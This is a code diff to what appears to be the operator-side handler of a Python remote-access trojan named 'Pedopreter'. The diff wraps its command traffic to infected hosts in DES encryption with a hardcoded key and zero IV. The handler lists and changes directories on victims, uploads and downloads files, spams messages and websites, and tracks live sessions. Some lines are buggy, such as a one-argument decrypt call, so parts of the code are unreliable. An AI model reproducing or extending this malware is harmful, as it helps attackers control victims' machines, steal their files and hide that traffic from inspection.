@@ -8,7 +8,41 @@ import pip
 import ctypes
 import threading as thread
 from threading import Thread
+import base64
+import IPython
+import simplecrypt
+import Crypto
+from pyDes import *
+
+from cryptography.fernet import Fernet
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import base64
+
+
 #init
+
+#some things you have to fill out: 
+
+#the passkey that you set for the payload and handler for encryption
+# WARNING MUST BE EXACTLY 8 BYTES LONG
+PASSKEY = "aaaaaaaa"
+
+
+
+
+
+
+def encrypt(password, data):
+    k = des(password, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+    d = k.encrypt(data)
+    return d
+
+def decrypt(password, data):
+    k = des(password, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+    d = k.decrypt(data)
+    return d
 
 try:
     input = raw_input
@@ -107,22 +141,26 @@ def main():
                         print("spammessage <message> <title> <amount>")
                         print("spamwebsite <website> <amout>")
                 elif thing2[0] == "ls":
-                    s.send(" ".join(thing2).encode())
-                    dataraw = s.recv(BUFFER_SIZE).decode()
+                    print("ls")
+                    msg = encrypt(PASSKEY, str(" ".join(thing2)))
+                    print("ls")
+                    print(msg)
+                    s.send(msg)
+                    dataraw = decrypt(PASSKEY, s.recv(BUFFER_SIZE)).decode()
                     data = dataraw.split()
                     for x in data:
                         print(x)
                 elif thing2[0] == "cd":
                     if len(thing2) == 2:
-                        s.send(" ".join(thing2).encode())
+                        s.send(encrypt(PASSKEY, " ".join(thing2)))
                         s.settimeout(10)
                         try:
-                            q = s.recv(BUFFER_SIZE).decode()
+                            q = decrypt(PASSKEY, s.recv(BUFFER_SIZE)).decode()
                             print(q)
                         except:
                             print("timed out")
                 elif thing2[0] == "upload":
-                    s.send(" ".join(thing2).encode())
+                    s.send(encrypt(PASSKEY, " ".join(thing2)))
                     time.sleep(1)
                     s.settimeout(50000)
                     uploading = True
@@ -133,7 +171,7 @@ def main():
                         print("File doesnt exist")
                     while (l):
                         try:
-                            s.send(l)
+                            s.send(encrypt(PASSKEY, l))
                             l = f.read(1024)
                         except Exception as e:
                             print("crap something went wrong during the upload.. the error is: " + str(e))
@@ -151,30 +189,30 @@ def main():
                             print("The following error occured: " + str(e))
                 elif thing2[0] == "download":
                     if len(thing2) == 3:
-                        s.send(" ".join(thing2).encode())
+                        s.send(encrypt(PASSKEY, " ".join(thing2)))
                         f = open("/Pedopreter/Downloaded/"+thing2[2], "wb")
-                        l = s.recv(1024)
+                        l = decrypt(PASSKEY, s.recv(1024))
                         f.write(l)
                         uploading = True
                         while (l):
                             print("receiving...")
                             try:
-                                l = s.recv(1024)
+                                l = decrypt(PASSKEY, s.recv(1024))
                                 f.write(l)
                             except:
                                 print("Something went wrong during the download. Maybe it doesnt exist anymore or the connection was closed. fuck you man you cant even download a file properly")
                         uploading = False
                         print("Done")
                 elif thing2[0] == "youtube":
-                    s.send(" ".join(thing2).encode())
+                    s.send(encrypt(PASSKEY," ".join(thing2)))
                 elif thing2[0] == None:
                     print("Thats nothing.. fuck.")
                 elif thing2[0] == "spammessage":
                     if len(thing2) > 2:
-                        s.send(" ".join(thing2).encode())
+                        s.send(encrypt(PASSKEY," ".join(thing2)))
                 elif thing2[0] == "spamwebsite":
                     if len(thing2) > 1:
-                        s.send(" ".join(thing2).encode())
+                        s.send(encrypt(PASSKEY, " ".join(thing2)))
         except Exception as e:
             print("whoops something went wrong.. reconnecting..")
             print("this was the error:")
@@ -186,12 +224,12 @@ def keepalive():
         for i, x in enumerate(sessions):
             try:
                 alive = False
-                x.send("keepalive".encode())
+                x.send(encrypt(PASSKEY, "keepalive"))
                 while alive == False and uploading == False:
                     try:
                         x.settimeout(15)
-                        it = x.recv(1024)
-                        if it.decode() == "still alive":
+                        it = decrypt(PASSKEY, x.recv(1024)).decode()
+                        if decrypt(it) == "still alive":
                             alive = True
                     except Exception:
                         print("Session number: " + str(i) + ". On address: " + str(addresses.pop(i)) + "Has lost connection or something wtf")
